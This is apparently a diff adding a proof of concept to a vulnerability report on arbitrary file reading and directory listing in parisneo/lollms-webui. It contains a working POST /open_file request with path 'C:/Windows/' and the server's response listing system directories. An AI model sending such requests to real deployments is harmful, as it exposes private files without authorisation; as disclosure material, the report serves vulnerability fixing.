@@ -1,7 +1,22 @@
 Title: Read files and list arbitrary directories in parisneo/lollms-webui
 
 Proof of Concept: 
+POST /open_file HTTP/1.1
+Host: 127.0.0.1:9600
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
 
+{"path": "C:/Windows/"}
+
+RESPONSE:
+
+HTTP/1.1 200 OK
+date: Tue, 07 May 2024 08:30:11 GMT
+server: uvicorn
+content-type: text/plain; charset=utf-8
+content-type: application/json
+content-length: 310
+
+["addins", "appcompat", "apppatch", "AppReadiness", "assembly", "bcastdvr", "Boot"]
 
 Impact: 
 Read any file on the Windows system and  list arbitrary directories.
